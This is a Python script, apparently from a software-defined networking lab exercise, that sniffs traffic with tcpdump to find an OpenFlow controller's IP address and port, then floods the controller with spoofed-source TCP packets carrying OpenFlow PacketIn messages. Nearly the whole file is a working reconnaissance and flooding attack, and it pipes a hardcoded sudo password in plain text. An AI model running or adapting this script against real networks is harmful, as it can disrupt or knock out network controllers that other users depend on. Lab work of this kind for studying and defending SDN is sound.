#script to acquire controller information and launch an attack on it

#!/usr/bin/env python

import subprocess
import time
from scapy.all import *
from scapy.contrib import openflow3 as op
import re
import json

#function to capture packets between controller and Mininet VM
def capture():
	x=subprocess.Popen(["echo sdn | sudo -S tcpdump -i eth0 -c 100 -w sdn_lab7_obj1.pcap"],stdout=subprocess.PIPE,shell=True)

	time.sleep(30)

#function to analyze the captured packets to get the required controller information
def analysis():

	a=rdpcap("sdn_lab7_obj1.pcap")

	controller={}

	for i in range(0,len(a)):
		try:
			temp=a[i][TCP].payload
			o1=str(temp.show)

			if "ECHO_REQUEST" in o1:
				ip=a[i][IP].src
				port=a[i][TCP].sport
				break
		except:
			pass

	#storing controller information in a file
	controller['ip']=ip
	controller['port']=port
	filename="controller_info.txt"
		
	f=open(filename,"w")
	json.dump(controller,f)

	print("Controller IP is {}".format(ip))
	print("Controller is listening on port {}.".format(port))

	print("Controller information has been saved in {} file.".format(filename))

#function to launch an attack on the controller
def attack():
	
	filename=open("controller_info.txt",'r')
	a=json.load(filename)
	#creating packets with scapy and sending them to controller
	for i in range(1,100):
        	packet = Ether()/IP(dst=a["ip"], src="192.168.10.21")/TCP(sport=9999, dport=a["port"], seq = i)/op.OFPTPacketIn()
        	sendp(packet, iface="eth0")

if __name__=="__main__":
	
	#capturing the packets between controller and the Mininet VM
	capture()
	#doing the analysis of the captured packets
	analysis()
	#launching the attack on controller
	attack()